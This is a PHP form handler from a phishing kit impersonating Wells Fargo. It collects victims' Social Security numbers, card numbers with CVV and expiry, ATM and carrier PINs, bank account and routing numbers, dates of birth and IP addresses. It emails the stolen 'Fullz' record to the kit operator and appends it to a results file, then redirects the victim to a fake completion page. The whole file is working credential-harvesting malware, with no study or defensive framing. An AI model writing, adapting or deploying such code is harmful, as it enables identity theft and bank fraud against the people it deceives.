<?php
error_reporting(0);

include 'email.php';
session_start();
include ('bt.php');
include 'config.php';
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");
$message .= "------[Wellsfargo - Spamtools.io]------\n";
$message .= "SSN: ".$_POST['ssn1']."/".$_POST['ssn2']."/".$_POST['ssn3']."\n";
$message .= "Driver License Number : ".$_POST['dln']."\n";
$message .= "ACC/CC NO: ".$_POST['accountNumber']."\n";
$message .= "Expiry: ".$_POST['exp']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "DOB: ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "ATM Pin: ".$_POST['atmpin']."\n";
$message .= "Carrier Pin: ".$_POST['carrierpin']."\n";
$message .= "Account Number: ".$_POST['accnum']."\n";
$message .= "Routing Number: ".$_POST['routing']."\n";

$message .= "Phone: ".$_POST['phn1']."/".$_POST['phn2']."/".$_POST['phn3']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Fullz-------------\n";
$from = "hacker@spam.tool.io";
    $subject = " Wellsfargo Details: ".$ip."\n"; 
    mail($send, $subject, $message, $from);m();


$milaf = fopen("../results/login.txt","a");
fwrite($milaf,$message);	

		   redirect("./complete.php?country.x=" . $_SESSION['cntc'] . "-" . $_SESSION['cntn'] . "&ReasonCode=04" . $ib . "=codes_list=OAM-2=" . $rans . "S=" . crypt($_SESSION['cntn']) . "" . include '../ran.php' . "");

		   


?>